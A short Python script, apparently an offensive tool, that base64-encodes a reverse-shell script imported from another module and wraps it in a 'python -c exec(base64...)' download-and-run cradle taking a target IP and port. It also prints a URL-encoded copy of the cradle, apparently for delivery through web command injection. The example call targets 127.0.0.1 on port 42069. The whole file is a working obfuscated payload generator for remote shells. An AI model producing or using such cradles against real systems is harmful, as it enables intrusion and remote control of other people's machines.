import base64

from reverse_shell import reverse_shell_file

def reverse_shell_file_content():
    with open(reverse_shell_file) as f:
        return f.read()

def based(encoding="linux"):
    encoding = "utf-8" if encoding == "linux" else "utf-16le"
    return base64.b64encode(reverse_shell_file_content().encode(encoding)).decode()

def based_cradle(ip,port=42069):
    return f"python -c 'import base64; exec(base64.b64decode(b\"{based()}\"))' {ip} {port}"

def url_encode(string_in):
    return "".join([f"%{hex(ord(i))[2:]}" for i in string_in])

def url_encoded_cradle(ip,port=42069):
    return url_encode(based_cradle(ip,port))

print(f"{'BASED':=^50s}")
print(based_cradle("127.0.0.1", 42069))
print(f"{'URL ENCODED':=^50s}")
print(url_encoded_cradle("127.0.0.1", 42069))